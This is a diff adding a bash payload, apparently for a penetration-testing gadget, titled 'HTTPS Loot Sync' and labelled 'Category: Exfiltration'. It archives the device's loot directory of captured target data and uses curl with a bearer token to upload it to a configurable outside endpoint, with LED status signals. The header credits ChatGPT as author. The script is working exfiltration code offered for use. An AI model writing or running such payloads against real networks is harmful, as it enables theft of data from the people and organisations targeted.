@@ -1,0 +1,75 @@
+#!/bin/bash
+# Title: HTTPS Loot Sync
+# Description: Bundles the loot directory and sends it to a controlled HTTPS endpoint with token auth and integrity verification.
+# Author: ChatGPT
+# Version: 1.0
+# Category: Exfiltration
+# Net Mode: WIFI_CLIENT
+#
+# LED State Descriptions
+# Magenta Solid  - preparing archive
+# Blue Blink     - uploading
+# Green Solid    - upload reported success
+# Red Blink      - missing dependency or upload failed
+#
+# Options
+LOOT_DIR="${LOOT_DIR:-/root/loot}"
+OUTPUT_DIR="${OUTPUT_DIR:-/root/loot/https-sync}"
+SYNC_ENDPOINT="${SYNC_ENDPOINT:-https://example.com/upload}"
+AUTH_TOKEN="${AUTH_TOKEN:-REPLACE_ME}"
+CA_CERT="${CA_CERT:-}"
+ARCHIVE_NAME="loot-$(date +%F-%H%M%S).tar.gz"
+
+_led() {
+    if command -v LED >/dev/null 2>&1; then
+        LED "$@"
+    else
+        echo "[LED:$*]"
+    fi
+}
+
+log() {
+    echo "[$(date --iso-8601=seconds)] $*" | tee -a "$LOG_FILE"
+}
+
+_led MAGENTA
+mkdir -p "$OUTPUT_DIR"
+LOG_FILE="$OUTPUT_DIR/https-sync-$(date +%F-%H%M%S).log"
+touch "$LOG_FILE"
+
+if ! command -v curl >/dev/null 2>&1; then
+    log "curl not found"
+    _led FAIL
+    exit 1
+fi
+
+if [ "$AUTH_TOKEN" = "REPLACE_ME" ]; then
+    log "Configure AUTH_TOKEN before use"
+    _led FAIL
+    exit 1
+fi
+
+if [ ! -d "$LOOT_DIR" ]; then
+    log "Loot directory $LOOT_DIR missing"
+    _led FAIL
+    exit 1
+fi
+
+cd "$LOOT_DIR" || exit 1
+tar -czf "$OUTPUT_DIR/$ARCHIVE_NAME" . >>"$LOG_FILE" 2>&1
+SHA256_SUM=$(sha256sum "$OUTPUT_DIR/$ARCHIVE_NAME" | awk '{print $1}')
+log "Archive created: $OUTPUT_DIR/$ARCHIVE_NAME (sha256: $SHA256_SUM)"
+
+_led BLUE
+curl_opts=(-s -w "%{http_code}" -o "$OUTPUT_DIR/upload.response" -H "Authorization: Bearer $AUTH_TOKEN")
+[ -n "$CA_CERT" ] && curl_opts+=(--cacert "$CA_CERT")
+
+STATUS=$(curl "${curl_opts[@]}" -F "file=@$OUTPUT_DIR/$ARCHIVE_NAME" -F "sha256=$SHA256_SUM" "$SYNC_ENDPOINT")
+if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
+    log "Upload reported success (HTTP $STATUS)"
+    _led GREEN
+else
+    log "Upload failed (HTTP $STATUS). See $OUTPUT_DIR/upload.response for server reply."
+    _led FAIL
+    exit 1
+fi
